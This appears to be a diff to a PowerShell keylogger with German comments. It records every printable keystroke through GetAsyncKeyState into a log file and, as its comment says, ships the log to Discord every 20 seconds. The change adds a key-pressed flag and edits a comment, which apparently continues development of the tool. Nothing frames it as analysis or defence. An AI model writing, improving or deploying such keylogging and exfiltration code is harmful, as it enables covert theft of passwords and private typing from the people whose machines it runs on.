@@ -28,13 +28,15 @@ while ($true) {
         break
     }
     # 1. Tastatureingaben aufzeichnen
+    $keyPressed = $false
     foreach ($char in 32..126) {
         if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
             Add-Content -Path $logFile -Value ([char]$char)
+            $keyPressed = $true
         }
     }
-    # 2. Alle X Sekunden Log an Discord schicken
-    if ((Get-Date).Second % 20 -eq 0) {  # Alle 20 Sekunden
+    # 2. Alle 20 Sekunden Log an Discord schicken
+    if ((Get-Date).Second % 20 -eq 0) {
         if (Test-Path $logFile) {
             $keylog = Get-Content $logFile -Raw
             if ($keylog.Trim().Length -gt 0) {
